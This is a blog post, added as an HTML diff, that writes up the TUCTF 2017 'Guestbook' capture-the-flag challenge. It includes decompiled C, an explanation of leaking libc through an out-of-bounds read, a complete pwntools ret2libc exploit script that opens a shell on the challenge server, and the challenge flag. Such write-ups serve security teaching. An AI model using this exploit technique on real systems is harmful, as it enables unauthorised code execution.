@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <title>aufarg:/var/log $ _</title>
+        <!-- Fonts -->
+        <link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'>
+        <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet"> 
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet"> 
+        
+        <!-- CSS -->
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/main.css" type="text/css" />
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/pygments.css" type="text/css" />
+        <link rel="stylesheet" href="https://aufarg.github.io/theme/css/font-awesome.css" type="text/css" />
+        <meta charset="utf-8" />
+      
+
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <div class="banner"><a href="https://aufarg.github.io">aufarg:/var/log $ _ <strong></strong></a></div>
+        </header><!-- /#banner -->
+	<div class="navigation">
+		<ol class="nav">
+			<li><a href="https://aufarg.github.io">Index</a> </li>
+			<li><a href="https://aufarg.github.io/archives.html">Archive</a></li>
+			<li><a href="https://aufarg.github.io/tags.html">Tags</a> </li>
+			<li><a href="https://aufarg.github.io/">RSS</a> </li>
+		</ol>
+	</div>
+        <nav id="menu"><ul>
+        </ul></nav><!-- /#menu -->
+        <div class="box">
+<section id="content" class="body">
+  <header class="post">
+    <h1 class="entry-title">
+      TUCTF 2017: Guestbook (250)
+    </h1>
+  </header>
+  <footer class="post-info">
+    <abbr>
+      Sun 26 November 2017 
+         By <a class="url fn" href="https://aufarg.github.io/author/aufar-gilbran.html">Aufar Gilbran</a>
+  
+    </abbr>
+  </footer><!-- /.post-info -->
+  <div class="entry-content">
+    <p>We are given an ELF executable file, <code>guestbook</code> and a service for the executable. Our goal is
+to spawn a shell from the service. Decompiling <code>guestbook</code> with IDA will yield this C pseudo-code:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-98h]@16</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+64h] [bp-34h]@11</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+68h] [bp-30h]@7</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [sp+6Ch] [bp-2Ch]@2</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [sp+7Fh] [bp-19h]@5</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="p">(</span><span class="o">**</span><span class="n">v9</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">);</span> <span class="c1">// [sp+80h] [bp-18h]@4</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="o">**</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// [sp+84h] [bp-14h]@4</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="o">*</span><span class="n">v11</span><span class="p">;</span> <span class="c1">// [sp+88h] [bp-10h]@2</span></span>
+<span class="code-line">  <span class="kt">char</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [sp+8Fh] [bp-9h]@4</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+90h] [bp-8h]@1</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x14u</span><span class="p">);</span></span>
+<span class="code-line">  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please setup your guest book:&quot;</span><span class="p">);</span></span>
+<span class="code-line">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span></span>
+<span class="code-line">  <span class="p">{</span></span>
+<span class="code-line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name for guest: #%d</span><span class="se">\n</span><span class="s">&gt;&gt;&gt;&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">v11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%15s&quot;</span><span class="p">,</span> <span class="n">v11</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">v11</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">dest</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span></span>
+<span class="code-line">  <span class="p">}</span></span>
+<span class="code-line">  <span class="n">v10</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span></span>
+<span class="code-line">  <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">system</span><span class="p">;</span></span>
+<span class="code-line">  <span class="n">v12</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span></span>
+<span class="code-line">  <span class="k">while</span> <span class="p">(</span> <span class="n">v12</span> <span class="p">)</span></span>
+<span class="code-line">  <span class="p">{</span></span>
+<span class="code-line">    <span class="k">do</span></span>
+<span class="code-line">      <span class="n">v8</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span></span>
+<span class="code-line">    <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v8</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span></span>
+<span class="code-line">    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;---------------------------&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;1: View name&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;2: Change name&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;3. Quit&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt;&gt;&quot;</span><span class="p">);</span></span>
+<span class="code-line">    <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span></span>
+<span class="code-line">    <span class="k">switch</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="p">{</span></span>
+<span class="code-line">      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span></span>
+<span class="code-line">        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Which entry do you want to change?</span><span class="se">\n</span><span class="s">&gt;&gt;&gt;&quot;</span><span class="p">);</span></span>
+<span class="code-line">        <span class="n">v5</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span></span>
+<span class="code-line">        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span></span>
+<span class="code-line">        <span class="p">{</span></span>
+<span class="code-line">          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter the name of the new guest.</span><span class="se">\n</span><span class="s">&gt;&gt;&gt;&quot;</span><span class="p">);</span></span>
+<span class="code-line">          <span class="k">do</span></span>
+<span class="code-line">            <span class="n">v8</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span></span>
+<span class="code-line">          <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v8</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span></span>
+<span class="code-line">          <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span></span>
+<span class="code-line">          <span class="n">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">[</span><span class="n">v5</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">        <span class="k">else</span></span>
+<span class="code-line">        <span class="p">{</span></span>
+<span class="code-line">          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter a valid number&quot;</span><span class="p">);</span></span>
+<span class="code-line">        <span class="p">}</span></span>
+<span class="code-line">        <span class="k">break</span><span class="p">;</span></span>
+<span class="code-line">      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span></span>
+<span class="code-line">        <span class="n">v12</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line">        <span class="k">break</span><span class="p">;</span></span>
+<span class="code-line">      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span></span>
+<span class="code-line">        <span class="n">readName</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">dest</span><span class="p">);</span></span>
+<span class="code-line">        <span class="k">break</span><span class="p">;</span></span>
+<span class="code-line">      <span class="k">default</span><span class="o">:</span></span>
+<span class="code-line">        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Not a valid option. Try again&quot;</span><span class="p">);</span></span>
+<span class="code-line">        <span class="k">break</span><span class="p">;</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line">  <span class="p">}</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>The <code>gets</code> function is pretty tempting to exploit. Unfortunately, we're not given a function to
+print flag, so we can only solve this with ret2libc. This means we'll need to leak libc base
+address to pwn this binary. We'll use readName function to do this. Here's the readName function
+after we decompile it with IDA:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">readName</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@2</span></span>
+<span class="code-line">  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-8h]@1</span></span>
+<span class="code-line"></span>
+<span class="code-line">  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Which entry do you want to view?</span><span class="se">\n</span><span class="s">&gt;&gt;&gt;&quot;</span><span class="p">);</span></span>
+<span class="code-line">  <span class="n">v2</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span></span>
+<span class="code-line">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span></span>
+<span class="code-line">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span></span>
+<span class="code-line">  <span class="k">else</span></span>
+<span class="code-line">    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter a valid number&quot;</span><span class="p">);</span></span>
+<span class="code-line">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+</pre></div>
+
+
+<p>Leaking the libc base address can be done by calling readName and give <code>6</code> as input. This will
+make puts to write the content of the address pointed by <code>v10</code>, which is pointing to <code>dest</code>.
+Since <code>dest</code> is an array filled with malloc'ed address, it will continue to leak the system
+address on <code>v9</code>. This is possible because the binary is 32-bit and malloc'ed address in 32-bit
+generally doesn't have any 0x00 byte (unless you're super unlucky).</p>
+<p>After we got the system address, we can create the ROP and get the shell. Here's the script to
+get the shell:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">p</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">util</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">wait_for_debugger</span><span class="p">(</span><span class="n">util</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1"># p = process(&#39;./guestbook&#39;)</span></span>
+<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;guestbook.tuctf.com&#39;</span><span class="p">,</span> <span class="mi">4545</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;view?</span><span class="se">\n</span><span class="s1">&gt;&gt;&gt;&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
+<span class="code-line"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span></span>
+<span class="code-line"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">+</span> <span class="mh">0x15f551</span> <span class="o">-</span> <span class="mh">0x3e3e0</span></span>
+<span class="code-line"><span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span></span>
+<span class="code-line"><span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">))</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1"># debug(p)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">rop</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x2c</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
+</pre></div>
+
+
+<p>Flag is: <code>TUCTF{k33p_17_up_k1d}</code></p>
+<p>P.S. Here I used <code>/bin/sh</code> string found in libc, which can be computed by getting the libc with
+the md5 provided from the challenge and then calculate it relative to <code>system</code> address that we
+found. You should be able to do it by giving one of the guest name to <code>/bin/sh</code> and then give
+the address to <code>system</code>. The address can be found when we leak libc base address.</p>
+  </div><!-- /.entry-content -->
+</section>
+            <hr/>
+            <footer id="contentinfo" class="footer">
+                <div>
+                    <a href="https://aufarg.github.io">Aufar Gilbran</a> (2012)
+                </div>
+                <div>
+                    powered by <a href="http://getpelican.com/">Pelican</a>
+                    and <a href="http://python.org">Python</a>. 
+                    Theme based on <a href="http://github.com/slok/iris">iris</a>
+                </div>
+                <div>
+                    Icons from Font Awesome by <a href="http://fontawesome.io/"> font awesome</a>.
+                    <a href="https://fonts.google.com/specimen/Open+Sans+Condensed">Title & headers</a>, <a href="https://fonts.google.com/specimen/Lato">body</a> and <a href="https://fonts.google.com/specimen/Inconsolata">source code</a> fonts by google fonts
+                </div>
+                <div class="social">
+                        <a href="https://github.com/aufarg"><i class="icon-github"></i>  </a>
+                        <a href="#"><i class="icon-Another social link"></i>  </a>
+                        <a href="mailto:aufargilbran@gmail.com"><i class="icon-envelope"></i> </a>
+                </div>
+            </footer><!-- /#contentinfo -->
+        </div>
+        <!--Add statistycs-->
+
+</body>
+</html>
